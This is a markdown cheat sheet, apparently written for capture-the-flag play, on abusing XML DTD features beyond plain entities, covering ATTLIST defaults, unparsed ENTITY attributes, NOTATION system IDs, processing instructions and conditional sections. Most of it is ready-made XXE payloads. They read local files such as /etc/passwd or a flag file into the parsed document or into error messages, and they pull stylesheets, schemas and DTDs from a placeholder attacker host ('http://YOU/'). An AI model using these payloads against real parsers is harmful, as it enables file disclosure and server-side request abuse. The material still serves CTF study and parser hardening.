# XML Structure Abuse — DTD features beyond entities

## The full DTD grammar — everything that can fetch or be exploited

```xml
<!DOCTYPE root [
  <!ELEMENT root ANY>                        — element decl
  <!ATTLIST root a CDATA #IMPLIED>           — attribute decl
  <!ENTITY x "v">                            — entity decl
  <!ENTITY % p "v">                          — param entity
  <!ENTITY u SYSTEM "uri" NDATA n>           — unparsed entity
  <!NOTATION n SYSTEM "uri">                 — notation decl
  <?pi target data?>                         — processing instruction
  <!-- comment -->
  %p;                                        — param entity reference
]>
```

Each declaration type is a surface.

## ELEMENT declarations — the schema-ish surface

```xml
<!ELEMENT r (a|b)*>
<!ELEMENT r ANY>
<!ELEMENT r (#PCDATA)>
<!ELEMENT r EMPTY>
<!ELEMENT a (#PCDATA|b)*>
```

Pure structure — no fetch — but a malformed ELEMENT decl can trigger
a specific parser error that fingerprints the parser.

## ATTLIST declarations — the default-value injection

```xml
<!ATTLIST r a CDATA "default">
<!ATTLIST r a CDATA "&x;">
<!ATTLIST r a (v1|v2) "v1">
<!ATTLIST r a ID #IMPLIED>
<!ATTLIST r a IDREF #IMPLIED>
<!ATTLIST r a ENTITY #IMPLIED>
<!ATTLIST r a ENTITIES #IMPLIED>
<!ATTLIST r a NMTOKEN #IMPLIED>
<!ATTLIST r a NMTOKENS #IMPLIED>
<!ATTLIST r a NOTATION (n1|n2) #IMPLIED>
<!ATTLIST r xml:space (default|preserve) "preserve">
```

The `CDATA "..."` default is the exploitable bit — an entity inside the
default value lands in the DOM attribute:

```xml
<!DOCTYPE r [
  <!ATTLIST r a CDATA "&x;">
  <!ENTITY x SYSTEM "file:///flag">
]>
<r/>
```

`<r/>` has no `a` — the ATTLIST supplies it with `&x;` expanded → the
DOM has `<r a="<file-content>"/>` — read the attribute.

### `ENTITY`/`ENTITIES` attribute type — unparsed-entity reference

```xml
<!ATTLIST r a ENTITY #IMPLIED>
<!NOTATION n SYSTEM "x">
<!ENTITY u SYSTEM "file:///flag" NDATA n>
<r a="u"/>
```

Attribute of type ENTITY → the parser loads the named unparsed entity —
the file content lands in the DOM without re-parse — the NDATA read.

## NOTATION declarations — the SYSTEM-id fetch

```xml
<!NOTATION n SYSTEM "file:///etc/passwd">
<!NOTATION n PUBLIC "-//X//EN" "file:///etc/passwd">
```

The notation's SYSTEM-id is a fetch — some parsers resolve it, some
don't — Xerces fetches it; the URI lands in the exception if it fails.

## Processing instructions — `<?target data?>`

```xml
<?xml-stylesheet type="text/xsl" href="http://YOU/x.xsl"?>
<?xml-model href="http://YOU/s.rng"?>
<?oxygen RNGSchema="http://YOU/s.rng"?>
```

PIs are in the document body OR the DTD — the `xml-stylesheet`/`xml-model`
fetch on parse; the vendor PIs (`oxygen`, `cocoon`, `php`) are editor-
specific.

## CDATA sections — the "don't parse this" section

```xml
<r><![CDATA[ literal < & > content ]]></r>
```

`]]>` is the only delimiter — content containing `]]>` breaks it. The
inverse trick — build a CDATA around a file — `cdata-wrapping.md`.

## Comments — `<!-- -->`

```xml
<!-- flag{...} -->
```

Comments parse — a challenge may hide the flag here — `<!--` inside an
entity value is literal, inside the DTD is a real comment.

## Conditional sections — `INCLUDE`/`IGNORE` — the DTD-only feature

```xml
<!DOCTYPE r [
<![INCLUDE[
  <!ENTITY x SYSTEM "file:///flag">
]]>
]]>
```

`<![INCLUDE[...]]>` / `<![IGNORE[...]]>` — conditional sections are ONLY
legal in EXTERNAL DTDs, not internal subsets — putting one in the
internal subset is a parse error — but in an external DTD you control:

```dtd
<![%param;[
  <!ENTITY x SYSTEM "file:///flag">
]]>
```

`%param;` = `INCLUDE` or `IGNORE` — a param-entity drives whether a
block is active — the "conditional DTD" trick.

## The `standalone="yes"` quirk

```xml
<?xml version="1.0" standalone="yes"?>
```

`standalone=yes` means "no external declarations needed" — some parsers
refuse to load the external DTD when `standalone=yes` — drop it or set
`standalone="no"` when using external DTDs.

## The encoding/`version`/`standalone` triple — parser edge cases

```xml
<?xml version="1.1"?>                    — XML 1.1 — different entity rules
<?xml version="1.0" standalone="yes"?>
<?xml version="1.0" encoding="UTF-16"?>
```

XML 1.1 has different newline/name rules — parsers that honor 1.1 may
treat some constructs differently — the version-flag edge case.

## The "the DOCTYPE's internal-subset vs external-subset" precedence

Internal subset wins over external for same-named entities:

```xml
<!DOCTYPE r SYSTEM "http://YOU/d.dtd" [
  <!ENTITY x "internal-wins">
]>
```

A same-named `x` in the external DTD is ignored — the precedence rule
is the merge-model for hybrid DOCTYPEs.

## The "the document element must match the DOCTYPE name" — validation

`<!DOCTYPE r ...><s>...</s>` — element name `r` vs `s` mismatch —
non-validating parsers ignore it; validating parsers reject — a config
fingerprint.
